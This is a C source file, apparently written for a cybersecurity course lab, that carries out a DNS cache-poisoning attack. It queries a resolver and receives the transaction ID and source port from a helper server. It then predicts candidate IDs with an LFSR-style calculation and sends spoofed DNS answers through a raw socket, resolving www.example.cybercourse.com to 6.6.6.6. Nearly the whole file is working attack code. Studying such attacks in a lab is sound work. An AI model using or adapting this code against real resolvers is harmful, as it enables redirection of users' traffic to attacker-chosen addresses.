

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <string.h>
#include <stdint.h>


#define SPOOFED_SOURCE_IP  "192.168.1.207"
#define DNS_SERVER_IP "192.168.1.203" // Google's public DNS server
#define DNS_SERVER_PORT 53      // Standard DNS port
#define BUFFER_SIZE 512         // Buffer size for the DNS query and response
#define INFO_SERVER_IP "192.168.1.201" // Server providing initial information
#define INFO_SERVER_PORT 4444          // Port for receiving info
#define TAP1 0x80000057
#define TAP2 0x80000062


int build_dns_query(unsigned char *buffer, const char *hostname, uint32_t tid);

#define BUFFER_SIZE 512
#define DNS_PORT 53

// Function to calculate checksum
unsigned short calculate_checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    for (; len > 1; len -= 2) {
        sum += *buf++;
    }
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void send_custom_ip_packet(const char *src_ip, const char *dest_ip, int src_port, int dest_port, uint8_t *dns_payload, int dns_payload_size) {
    char packet[BUFFER_SIZE];
    memset(packet, 0, BUFFER_SIZE);

    // IP Header
    struct ip *iph = (struct ip *)packet;
    iph->ip_hl = 5;                   // Header length (5 32-bit words = 20 bytes)
    iph->ip_v = 4;                    // IPv4
    iph->ip_tos = 0;                  // Type of Service
    iph->ip_len = htons(sizeof(struct ip) + sizeof(struct udphdr) + dns_payload_size); // Total length
    iph->ip_id = htons(54321);        // Identification
    iph->ip_off = 0;                  // Fragment offset
    iph->ip_ttl = 255;                // Time-to-Live
    iph->ip_p = IPPROTO_UDP;          // Protocol (UDP)
    iph->ip_src.s_addr = inet_addr(src_ip); // Source IP
    iph->ip_dst.s_addr = inet_addr(dest_ip); // Destination IP
    iph->ip_sum = 0;                  // Zero out checksum initially
    iph->ip_sum = calculate_checksum((unsigned short *)iph, sizeof(struct ip)); // Compute checksum

    // UDP Header
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct ip));
    udph->source = htons(src_port);   // Source port
    udph->dest = htons(dest_port);    // Destination port
    udph->len = htons(sizeof(struct udphdr) + dns_payload_size); // UDP length
    udph->check = 0;                 // Zero out checksum initially

    // Copy DNS payload
    memcpy(packet + sizeof(struct ip) + sizeof(struct udphdr), dns_payload, dns_payload_size);

    // Compute UDP checksum (optional but recommended for accuracy)
    struct pseudo_header {
        uint32_t src_ip;
        uint32_t dest_ip;
        uint8_t reserved;
        uint8_t protocol;
        uint16_t udp_length;
    } psh;

    psh.src_ip = inet_addr(src_ip);
    psh.dest_ip = inet_addr(dest_ip);
    psh.reserved = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_length = htons(sizeof(struct udphdr) + dns_payload_size);

    char pseudo_packet[BUFFER_SIZE];
    memcpy(pseudo_packet, &psh, sizeof(psh));
    memcpy(pseudo_packet + sizeof(psh), udph, sizeof(struct udphdr) + dns_payload_size);

    udph->check = calculate_checksum((unsigned short *)pseudo_packet, sizeof(psh) + sizeof(struct udphdr) + dns_payload_size);

    // Create raw socket
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        perror("Failed to create raw socket");
        exit(EXIT_FAILURE);
    }

    // Enable IP_HDRINCL
    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("Failed to set IP_HDRINCL");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Destination address
    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(dest_ip);

    // Send the packet
    if (sendto(sockfd, packet, sizeof(struct ip) + sizeof(struct udphdr) + dns_payload_size, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
        perror("Failed to send packet");
    } else {
        printf("Packet sent successfully from %s:%d to %s:%d\n", src_ip, src_port, dest_ip, dest_port);
    }

    close(sockfd);
}

void print_dns_payload(const uint8_t *payload, int size) {
    printf("DNS Payload (%d bytes):\n", size);
    for (int i = 0; i < size; i++) {
        // Print each byte in hexadecimal
        printf("%02x ", payload[i]);
        // Add a newline every 16 bytes for readability
        if ((i + 1) % 16 == 0) {
            printf("\n");
        }
    }
    if (size % 16 != 0) {
        printf("\n");
    }
    printf("\n");
}

// Function to encode a domain name into DNS format
void encode_domain_name(uint8_t *dns, const char *host) {
    int lock = 0;
    strcat((char *)dns, ".");
    for (int i = 0; i < (int) strlen(host); i++) {
        if (host[i] == '.') {
            *dns++ = i - lock;
            for (; lock < i; lock++) {
                *dns++ = host[lock];
            }
            lock++; // Skip the '.'
        }
    }
    *dns++ = '\0';
}

// Function to build a DNS query payload
int build_dns_payload(uint8_t *buffer, const char *hostname, uint16_t txid, uint16_t qtype) {
    uint8_t *ptr = buffer;

    // DNS Header (12 bytes)
    uint16_t flags = htons(0x8180); // Standard response 
    uint16_t q_count = htons(1);   // Number of questions
    uint16_t ans_count = htons(1);        // Number of answer RRs
    uint16_t auth_count = 0;       // Number of authority RRs
    uint16_t add_count = 0;        // Number of additional RRs

    *(uint16_t *)ptr = htons(txid); // Transaction ID
    ptr += 2;
    *(uint16_t *)ptr = flags;       // Flags
    ptr += 2;
    *(uint16_t *)ptr = q_count;     // Questions
    ptr += 2;
    *(uint16_t *)ptr = ans_count;   // Answer RRs
    ptr += 2;
    *(uint16_t *)ptr = auth_count;  // Authority RRs
    ptr += 2;
    *(uint16_t *)ptr = add_count;   // Additional RRs
    ptr += 2;

    // DNS Question Section
    encode_domain_name(ptr, hostname); // Encode the query name
    ptr += strlen((const char *)ptr) + 1;

    *(uint16_t *)ptr = htons(qtype);  // Query type (e.g., A = 1, AAAA = 28, MX = 15)
    ptr += 2;
    *(uint16_t *)ptr = htons(1);      // Query class (IN = 1 for internet)
    ptr += 2;

    // DNS Answer Section
    unsigned char *answer = (unsigned char *)(ptr + 1);
    *(uint16_t *)answer = htons(0xc00c); // Pointer to the name (offset 0x0c)
    answer += 2;
    *(uint16_t *)answer = htons(1);      // Type A
    answer += 2;
    *(uint16_t *)answer = htons(1);      // Class IN
    answer += 2;
    *(uint32_t *)answer = htonl(300);    // TTL (300 seconds)
    answer += 4;
    *(uint16_t *)answer = htons(4);      // Data length (4 bytes for IPv4)
    answer += 2;
    *(uint32_t *)answer = inet_addr("6.6.6.6"); // Resolved IP address

    return answer - buffer; // Return the size of the payload
}

int full_send_spoofed_dns(uint txid, uint source_port) {
    const char *src_ip = "192.168.1.204";  // Custom source IP
    const char *dest_ip = "192.168.1.203"; // Resolver IP
    int src_port = source_port;                  // Custom source port
    int dest_port = source_port;                    // DNS port

    uint8_t dns_payload[BUFFER_SIZE];
    int dns_payload_size = build_dns_payload(dns_payload, "www.example.cybercourse.com", txid, 1); // Query for A record
    printf("dns_payload_size: %d\n", dns_payload_size);
    printf("dns_payload: %s\n", dns_payload);
    send_custom_ip_packet(src_ip, dest_ip, src_port, dest_port, dns_payload, dns_payload_size);

    return 0;
}









// Function to fill the txid_ls with the 10 possible txid
void fill_txids(uint32_t *txid_ls, uint32_t txid){
    // if the LSbit of r_1 = LSbit r_2 = 0 
    txid_ls[8] = txid >> 1;
    // set the left most bit of txid_ls[0] to 1, txid is 16 bits
    txid_ls[9] = (txid >> 1) | (1<<31);
    
    // else if the LSbit of r_1 = LSbit r_2 = 1
    for (int i = 0; i < 4; i ++) {
        txid_ls[i] = ((((txid >> 1) ^ TAP1 ^ TAP2) >> 1) ^ TAP1 ^ TAP2) | (i<<30);
    }
    
    for (int i = 0; i < 4; i ++) {
        txid_ls[4 + i] = (((txid >> 1) ^ TAP1 ^ TAP2) >> 1) | (i<<30);
    }
}
    
int socket_creation(struct sockaddr_in *server_addr){
    // Create a socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Configure the server address
    printf("configure the server address \n");
    memset(server_addr, 0, sizeof(*server_addr));
    (*server_addr).sin_family = AF_INET;
    (*server_addr).sin_port = htons(INFO_SERVER_PORT);
    inet_pton(AF_INET, INFO_SERVER_IP, &server_addr->sin_addr);

    // Connect to the server
    printf("connect to the server\n");
    if (connect(sockfd, (struct sockaddr *)server_addr, sizeof(*server_addr)) < 0) {
        perror("Connection to info server failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    return sockfd;
}

// Function to communicate with the info server and get the txid
void run_attack(uint32_t *txid_ls) {
    // connect to server attacker
    int sockfd1;
    struct sockaddr_in server_addr1;
    char txid_buffer[BUFFER_SIZE];
    uint32_t txid = 0;
    unsigned int source_port = 0;

    sockfd1 = socket_creation(&server_addr1);
    
    printf("Attacker server connected: %s:%d\n", inet_ntoa(server_addr1.sin_addr), ntohs(server_addr1.sin_port));
    
    // send the DNS request  ################ step 1 #####################
    const char *hostname = "www.attacker.cybercourse.com";
    int sockfd;
    struct sockaddr_in server_addr;
    unsigned char buffer[BUFFER_SIZE];

    // Step 1: Create a UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }
    // Step 2: Configure the DNS server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(DNS_SERVER_PORT);
    inet_pton(AF_INET, DNS_SERVER_IP, &server_addr.sin_addr);
    printf("step 2 done\n");
    // Step 3: Build the DNS query
    int query_len = build_dns_query(buffer, hostname, 1234);
    printf("step 3 done\n");
    printf("buffer: %s\n", buffer);
    // Step 4: Send the DNS query
    if (sendto(sockfd, buffer, query_len, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Failed to send DNS query");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("DNS query sent for hostname: %s\n", hostname);
    printf("waiting for txid\n");
    // Receive the txid from the server
    int bytes_received = recv(sockfd1, txid_buffer, BUFFER_SIZE - 1, 0); // fix this
    if (bytes_received < 0) {
        perror("Failed to receive data from info server");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    txid_buffer[bytes_received] = '\0'; // Null-terminate the received string
    printf("Received from server: %s\n", txid_buffer);

    // Parse the txid
    if (sscanf(txid_buffer, "TXID: %u, PORT: %u", &txid, &source_port) != 2) {
        fprintf(stderr, "Failed to parse TXID from server response\n");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("Extracted TXID: %u\n", txid);
    printf("source port : %u\n", source_port);
    fill_txids(txid_ls, txid);
    sleep(0.5);
    for (int i = 0; i < 10; i++) {
        // send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port, txid_ls[i]);
        full_send_spoofed_dns(txid_ls[i], source_port);
        // send_spoofed_packet(RESOLVER_IP, source_port, DNS_QUERY_NAME, txid_ls[i]);
    }
    
    // Close the connection
    close(sockfd);
    close(sockfd1);
}


// Function to build a DNS query
int build_dns_query(unsigned char *buffer, const char *hostname, uint32_t tid) {
    int query_len = 0;
    uint32_t txid = htons(tid); // Transaction ID
    unsigned short flags = htons(0x0100); // Standard query
    unsigned short q_count = htons(1);   // 1 question
    unsigned short ans_count = 0;        // No answers
    unsigned short auth_count = 0;       // No authority
    unsigned short add_count = 0;        // No additional

    // Header section
    memcpy(buffer + query_len, &txid, 2);
    query_len += 2;
    memcpy(buffer + query_len, &flags, 2);
    query_len += 2;
    memcpy(buffer + query_len, &q_count, 2);
    query_len += 2;
    memcpy(buffer + query_len, &ans_count, 2);
    query_len += 2;
    memcpy(buffer + query_len, &auth_count, 2);
    query_len += 2;
    memcpy(buffer + query_len, &add_count, 2);
    query_len += 2;
    printf("got here \n");
    // Question section (convert hostname to DNS format)
    char buffer2[512];
    strcpy(buffer2, hostname);
    const char *token = strtok((char *)buffer2, ".");
    printf("got here \n");
    while (token) {
        size_t len = strlen(token);
        buffer[query_len++] = (unsigned char)len;
        memcpy(buffer + query_len, token, len);
        query_len += len;
        token = strtok(NULL, ".");
    }

    buffer[query_len++] = 0; // End of hostname

    // Question Type (A record)
    unsigned short qtype = htons(1); // Type A
    memcpy(buffer + query_len, &qtype, 2);
    query_len += 2;

    // Question Class (IN)
    unsigned short qclass = htons(1); // Class IN
    memcpy(buffer + query_len, &qclass, 2);
    query_len += 2;

    return query_len;
}

int main() {
    uint32_t txid[10];

    // Step 1: Get the TXID from the info server
    run_attack(txid);


    return 0;
}
